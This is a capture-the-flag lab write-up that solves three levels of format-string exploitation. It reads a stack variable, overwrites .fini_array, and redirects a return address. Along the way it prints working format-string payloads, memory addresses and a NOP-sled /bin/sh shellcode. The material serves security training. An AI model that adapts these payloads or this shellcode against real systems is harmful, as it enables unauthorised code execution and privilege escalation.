## lab04

**Level C**
First I take a look to the source code, then make some conclusion:

+ The flag file is intentionally load into variable `real_pass`, if I input this string correctly, a shell will be spawned (it is not the real solution, obviously).
+ Statement at line 60 is exploitable since it directedly outputs a user specified string without formatting.

The approach is straight forward, to input some crafted format string to read variable `real_pass`.

At machine code level, we may infer the addresses of these variables:

|variable|offset|address|
|--|--|--|
|`username`|`esp+0x94`|`0xbffff624`|
|`real_pass`|`esp+0x76`|`0xbffff606`|
|`in_pass`|`esp+0x12`|`0xbffff5a2`|

The address of `in_pass` can be obtained from some probing format strings (the first string prints the content of `in_pass` and the next one shows its address):

![probing](04c1.png)

Next step is to find the currently offset of `username` when the control flow is at line 60. I obtain it manually:

![stupidmanually](04c2.png)

It is now at `%37$08x`. Then by the address of `real_pass`, I am able to obtain the content:

![flagc](04c3.png)

The flag is `bu7_1t_w4sn7_brUt3_f0rc34b1e!`.

---

**Level B**
First thing is to check the security configuration. It is shown that relro is disabled. Then the approach is dtor overwriting.

![relro](04b1.png)

Follow the instruction of destructor list overwriting, the control flow can be exploited, with the following input:

```python
print '\xac\x98\x04\x08' + '%08x'*5 + '%n'
```

where `0x080498ac` is the address of `.fini_array`. To inject shellcode, I choose `argv` command line arguments. In GDB, the address of the first command line argument is `0xbffff84b`. Here is the complete format string for exploitation:

```python
# file: /tmp/w.py
print '\xac\x98\x04\x08CIRQ\xae\x98\x04\x08' + '%08x'*4 + '%63519x%hn' + '%51124x%hn'
```

Since the address vale outside GDB differs from which inside, an NOP sled is essential for shellcode. After several attemps, a working shellcode given as:

```python
# file: /tmp/k.py
print '\x90'*1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80' + '\x90'
```

Executing with them in some strange redirections:

![exec](04b2.png)

![flagb](04b3.png)

The flag is `fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3`.

---

**Level A**
In this problem, I use **the same shellcode in level B** excepts that prefixed NOP is 500 bytes long. The idea is similar to previous one.

I injected shellcode in command line arguments, exploiting the binary by formatting string vulnerability occurs in the program. However, this time RELRO is enabled so that the dtor is immutable. Luckily, there is a local function call `log_wrapper`, which provides an vulnerability of redirection.

In `log_wrapper`, a local buffer is provided, however, the program writes the buffer by `snprintf` so that simple buffer overflow does not work. Indeed, this is a problem with solution, so I found this function wrongly accepts an user input argument as format string, then the solution is straight forward.

> At first, I have other idea such as overwriting the flag parameter in `open` function so that all user may have the priviledge to access the `.pass` file. However it fails, seems that code segment is read only.

Here I use a trick, by using [fixenv](https://github.com/hellman/fixenv), the address value inside and outside GDB is exactly the same.

At first, I construct the fixed length format string so that all address are in place.

```python
"AAAA" + "BBBB" + "CCC" + "%000008x%100\$x" + "%000008x%101\$x"
```

Some addresses are:

+ return address of `log_wrapper`: 0xbffff4ec
+ address of format string when `snprintf` is invoked: 0xbffff3b8
+ first command line argument: 0xbffff74c
+ second command line argument: 0xbffff774

Then I construct the following format string:

```python
"\xec\xf4\xff\xbf" + "\xee\xf4\xff\xbf" + "AAA" + "%63337x%229\$hn" + "%51339x%230\$hn"
```

![flaga](04a1.png)

Flag is `1t_w4s_ju5t_4_w4rn1ng`.